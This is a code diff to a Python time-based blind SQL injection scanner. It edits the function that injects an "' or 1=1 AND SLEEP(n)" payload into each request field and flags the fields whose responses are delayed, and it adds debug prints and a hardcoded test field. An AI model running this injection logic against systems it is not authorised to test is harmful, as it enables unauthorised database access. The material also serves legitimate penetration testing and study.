@@ -146,7 +146,7 @@ def measure_request_time_no_threads(url, method, headers, cookies, data):
         r = requests.get(url, headers = headers, cookies = cookies, params = data.items())
         return r.elapsed.total_seconds()
     elif method == M_POST:
-        r = requests.post(url, headers = headers, cookies = cookies, data = data.items())
+        r = requests.post(url, headers = headers, cookies = cookies, data = data)
         return r.elapsed.total_seconds()
     else:
         return -1
@@ -154,17 +154,22 @@ def measure_request_time_no_threads(url, method, headers, cookies, data):
 
 def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
     vuln_fields ={}
-    sql = '{} AND SLEEP({}) {}'
+    sql = '{} or 1=1 AND SLEEP({}) {}'
     m_data = data.copy()
     elapsed_time = -1
     for field in m_data:
         m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[COMMENT_SUFF])
+        print(m_data[field])
         elapsed_time = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        print(elapsed_time)
 
     if elapsed_time >= sleep_time:
         vuln_fields.update({field:COMMENT_SUFF})
+        print(vuln_fields)
     for field in vuln_fields:
+        print(m_data)
         m_data.pop(field)
+        
 
     if len(m_data) == 0:
         return vuln_fields
@@ -174,7 +179,9 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
         elapsed_time = measure_request_time_no_threads(url, method, headers, cookies, m_data)
     if elapsed_time >= sleep_time:
         vuln_fields.update({field:AND_SUFF})
+        print(vuln_fields)
     for field in vuln_fields:
+        print(m_data)
         m_data.pop(field)
 
     if len(m_data) == 0:
@@ -347,15 +354,19 @@ def main(argv):
 
     url = args.url
     method = args.method
+    print(args.data)
     data = ast.literal_eval(args.data)
     sleep_time = args.sleep
     threads_num = args.threads
+
+    data = {'userid':'id'}
+    print(url)
+    print(data.items())
 
     verbose = args.verbose
     log = args.log
 
     print("data:", type(data))
-
     headers = {
         'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
         'Cache-Control': 'no-cache',
@@ -370,6 +381,8 @@ def main(argv):
         print('Evaluating response time...')
         avg_resp_time = evaluate_response_time(url, method, headers, cookies, data)
         sleep_time = evaluate_sleep_time(avg_resp_time)
+
+    print(sleep_time)
 
     print('Looking for vulnerable fields...\n')
     vuln = find_vuln_fields(url, method, headers, cookies, data, sleep_time)
